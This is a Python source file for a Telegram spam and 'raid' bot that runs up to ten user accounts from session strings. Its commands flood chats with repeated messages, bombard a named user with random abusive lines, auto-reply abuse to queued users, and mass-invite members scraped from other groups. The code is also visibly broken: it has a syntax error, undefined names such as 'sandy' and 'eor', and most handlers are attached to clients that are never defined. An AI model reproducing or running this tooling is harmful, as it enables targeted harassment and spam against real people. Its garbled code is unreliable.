import asyncio
import os
import random
import sys
from datetime import datetime

import telethon.utils
from telethon import TelegramClient, events
from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.sessions import StringSession
from telethon.tl import functions, types
from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest

from Config import (
    API_HASH,
    API_ID,
    STRING,
    STRING2,
    STRING3,
    STRING4,
    STRING5,
    STRING6,
    STRING7,
    STRING8,
    STRING9,
    STRING_10,
    SUDO_USERS,
)
from Utils import RAID, RRAID

a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING_10


luc = ""
luc2 = ""
luc3 = ""
luc4 = ""
luc5 = ""
luc6 = ""
luc7 = ""
luc8 = ""
luc9 = ""
luc10 = ""


que = {}

SMEX_USERS = [5046719296]
for x in SUDO_USERS:
    SMEX_USERS.append(x)


async def start_Ustad():
    global luc
    global luc2
    global luc3
    global luc4
    global luc5
    global luc6
    global luc7
    global luc8
    global luc9
    global luc10
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        luc = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await luc.start()
            botme = await luc.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            luc = "smex"
            print(e)
    else:
        print("Session 1 not Found")
        session_name = "LuciXSpam"
        luc = TelegramClient(session_name, a, b)
        try:
            await luc.start()
        except Exception:
            pass

    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        luc2 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await .start()
            botme = await luc2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 2 not Found")
        session_name = "LuciXSpam"
        luc2 = TelegramClient(session_name, a, b)
        try:
            await luc2.start()
        except Exception:
            pass

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        luc3 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await luc3.start()
            botme = await luc3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 3 not Found")
        session_name = "startup"
        luc3 = TelegramClient(session_name, a, b)
        try:
            await luc3.start()
        except Exception:
            pass

    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        luc4 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await luc4.start()
            botme = await luc4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 4 not Found")
        session_name = "startup"
        luc4 = TelegramClient(session_name, a, b)
        try:
            await luc4.start()
        except Exception:
            pass

    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        luc5 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await luc5.start()
            botme = await luc5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 5 not Found")
        session_name = "startup"
        luc5 = TelegramClient(session_name, a, b)
        try:
            await luc5.start()
        except Exception:
            pass

    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        luc6 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await luc6.start()
            botme = await luc6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 6 not Found")
        session_name = "startup"
        luc6 = TelegramClient(session_name, a, b)
        try:
            await luc6.start()
        except Exception:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        luc7 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await luc7.start()
            botme = await luc7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 7 not Found")
        session_name = "startup"
        luc7 = TelegramClient(session_name, a, b)
        try:
            await luc7.start()
        except Exception:
            pass

    if eight:
        session_name = str(eight)
        print("String 8 Found")
        luc8 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await luc8.start()
            botme = await luc8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 8 not Found")
        session_name = "startup"
        luc8 = TelegramClient(session_name, a, b)
        try:
            await luc8.start()
        except Exception:
            pass

    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        luc9 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await luc9.start()
            botme = await luc9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 9 not Found")
        session_name = "startup"
        luc9 = TelegramClient(session_name, a, b)
        try:
            await luc9.start()
        except Exception:
            pass

    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        luc10 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await luc10.start()
            botme = await luc10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 10 not Found")
        session_name = "startup"
        luc10 = TelegramClient(session_name, a, b)
        try:
            await luc10.start()
        except Exception:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(start_Ustad())


async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception:
        pass

ALIVE_PIC = "https://telegra.ph/file/b66e8636032eb17e9c352.jpg"
import os
lucifer = os.environ.get("ALIVE_PIC",None)
if not lucifer:
 lucifer ="https://telegra.ph/file/b66e8636032eb17e9c352.jpg"
@luc.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
####
async def alive(event):
  if event.sender_id in SMEX_USERS:
    sed = await event.client.get_me()
    kk = sed.first_name
    k = sed.id
    s = f"[{kk}](tg://user?id={k})"
    tf = f"""
**
   ᎽϴႮᎡ ՏᏢᎪᎷ ᏴϴͲ ᏆՏ ᏔϴᎡᏦᏆΝᏀ 

   ᏢᎽͲᎻϴΝ - 3.0
   ͲᎬᏞᎬͲᎻϴΝ - 1.0
   ᏢᏞႮᏀᏆΝՏ - 8 ϴҒ 8
   ᎠᎬᏙՏ - **[ ᏃᎬᏢᎻᎽᎡ ](https://t.me/Zephyr_Owner)
   ᎡᎬᏢϴ - ՏϴϴΝ 
   ՏႮᏢᏢϴᎡͲ - **[ ҒᏆΝᎪᏞ ՏͲᎡᏆᏦᎬ](https://t.me/FinalStrikeOp)
   ϴᏔΝᎬᎡ - **[ ᏞႮᏟᏆҒᎬᎡ ](https://t.me/FS_LUCIF3R)

"""
    await event.client.send_file(event.chat_id,lucifer,caption=tf, force_document=False, link_preview=False)
import time
from time import sleep





@luc.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.join"))
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = Ustad[0]
            text = "Joining..."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@luc.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = Ustad[0]
            text = "Joining...."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@luc.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = jatt[0]
            bc = int(bc)
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Succesfully Left")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )




@idk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(Ustad) == 2:
            message = str(Ustad[1])
            counter = int(Ustad[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        elif e.reply_to_msg_id and smex.media:
            counter = int(Ustad[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex)
                await asyncio.sleep(0.0)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(Ustad[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)

@idk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        await e.get_reply_message()
        if len(Ustad) == 2:
            message = str(Ustad[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(Ustad[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.0)
        elif e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(Ustad[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True))
@ydk.on(events.NewMessage(incoming=True))
@wdk.on(events.NewMessage(incoming=True))
@hdk.on(events.NewMessage(incoming=True))
@sdk.on(events.NewMessage(incoming=True))
@adk.on(events.NewMessage(incoming=True))
@bdk.on(events.NewMessage(incoming=True))
@cdk.on(events.NewMessage(incoming=True))
@edk.on(events.NewMessage(incoming=True))
@ddk.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.0)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )



@idk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "Pong!"
        event = await e.reply(text, parse_mode=None, link_preview=None)
        end = datetime.now()
        ms = (end - start).microseconds / 1000
        await event.edit(f"💫 𝗣𝗼𝗻𝗴!\n`{ms}` 𝗺𝘀\n   🔥 𝙕𝙀𝙋𝙃𝙔𝙍 & 𝘼𝙒𝙀𝙍𝙄𝙏𝙊 🔥")


@idk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "𝙍𝙚𝙨𝙩𝙖𝙧𝙩𝙚𝙙\n\nPlease wait till it reboots..."
        await e.reply(text, parse_mode=None, link_preview=None)
        try:
            await idk.disconnect()
        except Exception:
            pass
        try:
            await ydk.disconnect()
        except Exception:
            pass
        try:
            await wdk.disconnect()
        except Exception:
            pass
        try:
            await hdk.disconnect()
        except Exception:
            pass
        try:
            await sdk.disconnect()
        except Exception:
            pass
        try:
            await adk.disconnect()
        except Exception:
            pass
        try:
            await bdk.disconnect()
        except Exception:
            pass
        try:
            await cdk.disconnect()
        except Exception:
            pass
        try:
            await ddk.disconnect()
        except Exception:
            pass
        try:
            await edk.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@idk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "🔥 ᏟϴᎷᎷᎪΝᎠՏ 🔥\n\n༒ᏢᏆΝᏀ\n༒ᎡᎬՏͲᎪᎡͲ\n༒ᎫϴᏆΝ\n༒ᏞᎬᎪᏙᎬ\n༒ᏢᎫϴᏆΝ\n༒ᏴᏆᏀՏᏢᎪᎷ\n༒ᎡᎪᏆᎠ\n༒ᎡᎬᏢᏞᎽᎡᎪᏆᎠ\n༒ᎪᏞᏆᏙᎬ\n༒ᎪᎠᎠՏႮᎠϴ\n\n\n      ᏴᎽ ༒ ᎪᎡႮΝ & ᏞႮᏟᏆҒᎬᎡ ༒"
       await e.reply(text, parse_mode=None, link_preview=None )

# --------------------------------------------------------------------------------------------------------------------------------


from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.tl import functions
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest

async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("`Invalid channel/group`")
            return None
        except ChannelPrivateError:
            await event.reply(
                "`This is a private channel/group or I am banned from there`"
            )
            return None
        except ChannelPublicGroupNaError:
            await event.reply("`Channel or supergroup doesn't exist`")
            return None
        except (TypeError, ValueError):
            await event.reply("`Invalid channel/group`")
            return None
    return chat_info


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    full_name = " ".join(names)
    return full_name

@idk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
async def get_users(event):
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        hell = await eor(event, "`processing...`")
    else:
        hell = await eor(event, "`processing...`")
    he_ll = event.pattern_match.group(1)
    if he_ll == "@FinalStrikeOp":
        return await hell.edit("Restricted to invite users from there.")
    elif he_ll == "@FinalStrikeOp":
        return await hell.edit("Restricted to invite users from there.")
    elif he_ll == "@FinalStrikeOp":
        return await hell.edit("Restricted to invite users from there.")
    kraken = await get_chatinfo(event)
    chat = await event.get_chat()
    if event.is_private:
        return await hell.edit("`Sorry, Cant add users here`")
    s = 0
    f = 0
    error = "None"

    await hell.edit("**INVITING USERS !!**")
    async for user in event.client.iter_participants(kraken.full_chat.id):
        try:
            if error.startswith("Too"):
                return await hell.edit(
                    f"**INVITING FINISHED !**\n\n**Error :** \n`{error}`\n\n**Invited :**  `{s}` users. \n**Failed to Invite :** `{f}` users."
                )
            await event.client(
                functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
            )
            s = s + 1
            await hell.edit(
                f"**INVITING USERS.. **\n\n**Invited :**  `{s}` users \n**Failed to Invite :**  `{f}` users.\n\n**×Error :**  `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await hell.edit(
        f"**INVITING FINISHED** \n\n**Invited :**  `{s}` users \n**Failed :**  `{f}` users."
    )




text = """ """

print(text)
print("")
print(
    "CONGRATULATIONS 🥳🥳..UR Spam Bots Ready to use"
)
if len(sys.argv) not in (1, 3, 4):
    try:
        idk.disconnect()
    except Exception:
        pass
    try:
        ydk.disconnect()
    except Exception:
        pass
    try:
        wdk.disconnect()
    except Exception:
        pass
    try:
        hdk.disconnect()
    except Exception:
        pass
    try:
        sdk.disconnect()
    except Exception:
        pass
    try:
        adk.disconnect()
    except Exception:
        pass
    try:
        bdk.disconnect()
    except Exception:
        pass
    try:
        cdk.disconnect()
    except Exception:
        pass
    try:
        edk.disconnect()
    except Exception:
        pass
    try:
        ddk.disconnect()
    except Exception:
        pass
else:
    try:
        idk.run_until_disconnected()
    except Exception:
        pass
    try:
        ydk.run_until_disconnected()
    except Exception:
        pass
    try:
        wdk.run_until_disconnected()
    except Exception:
        pass
    try:
        hdk.run_until_disconnected()
    except Exception:
        pass
    try:
        sdk.run_until_disconnected()
    except Exception:
        pass
    try:
        adk.run_until_disconnected()
    except Exception:
        pass
    try:
        bdk.run_until_disconnected()
    except Exception:
        pass
    try:
        cdk.run_until_disconnected()
    except Exception:
        pass
    try:
        edk.run_until_disconnected()
    except Exception:
        pass
    try:
        ddk.run_until_disconnected()
    except Exception:
        pass
